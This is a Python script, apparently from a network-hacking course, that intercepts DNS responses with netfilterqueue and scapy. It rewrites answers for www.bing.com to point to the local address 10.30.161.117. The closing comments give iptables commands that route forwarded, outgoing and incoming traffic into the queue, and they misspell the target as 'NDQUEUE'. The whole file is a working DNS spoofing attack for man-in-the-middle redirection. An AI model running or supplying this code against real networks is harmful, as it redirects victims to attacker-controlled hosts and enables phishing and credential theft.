import netfilterqueue
import scapy.all as scapy


def processPacket(packet):
    myScapyPacket = scapy.IP(packet.get_payload())    # This is converting packet to scapy packet so we can see and change everything.
    if myScapyPacket.haslayer(scapy.DNSRR): # This means dns response. ( DNS Responce Record ) if its DNSRQ it's request ( DNS Question Record )
        qname = myScapyPacket[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            print(myScapyPacket.show())
            answer = scapy.DNSRR(rrname=qname, rdata="10.30.161.117")
            myScapyPacket[scapy.DNS].an = answer
            myScapyPacket[scapy.DNS].ancount =  1
            
            del myScapyPacket[scapy.IP].len
            del myScapyPacket[scapy.IP].chksum
            del myScapyPacket[scapy.UDP].chksum
            del myScapyPacket[scapy.UDP].len

            print("-----------------------------------------------------")

            packet.set_payload(str(myScapyPacket))

            mylastScapyPacket = scapy.IP(packet.get_payload())
            print(mylastScapyPacket.show())
            
    packet.accept()    # Packet has came to python and we accept it to go or we can drop the packet

    # packet.drop()
    

queue = netfilterqueue.NetfilterQueue()

queue.bind(0, processPacket)    # This is bind this queue with the queue number 0 that we create before on linux system and every packet in that queue will go to process packet function

queue.run()


# The linux Command for queueing packets
# iptables -I FORWARD -j NDQUEUE --queue-num 0
# iptables -I OUTPUT -j NDQUEUE --queue-num 0 -> this is my computer's network
# iptables -I INPUT -j NDQUEUE --queue-num 0
# iptables --flush



